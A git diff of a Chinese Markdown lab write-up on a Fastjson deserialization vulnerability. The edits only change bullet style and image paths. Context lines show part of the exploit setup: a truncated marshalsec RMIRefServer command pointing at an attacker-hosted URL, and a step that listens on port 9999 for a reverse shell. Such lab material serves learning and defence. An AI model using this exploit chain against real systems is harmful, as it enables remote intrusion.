@@ -6,8 +6,8 @@ Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，�
 
 参考链接：
 
-- https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955
-- https://www.freebuf.com/vuls/208339.html
+* https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955
+* https://www.freebuf.com/vuls/208339.html
 
 ## 环境搭建
 
@@ -72,9 +72,8 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 }
 ```
 
-![image-20220223130855285](images/202202231308359.png)
+![image-20220223130855285](../.gitbook/assets/202202231308359.png)
 
 监听9999端口，接收反弹shell：
 
-![image-20220223130812872](images/202202231308945.png)
-
+![image-20220223130812872](../.gitbook/assets/202202231308945.png)
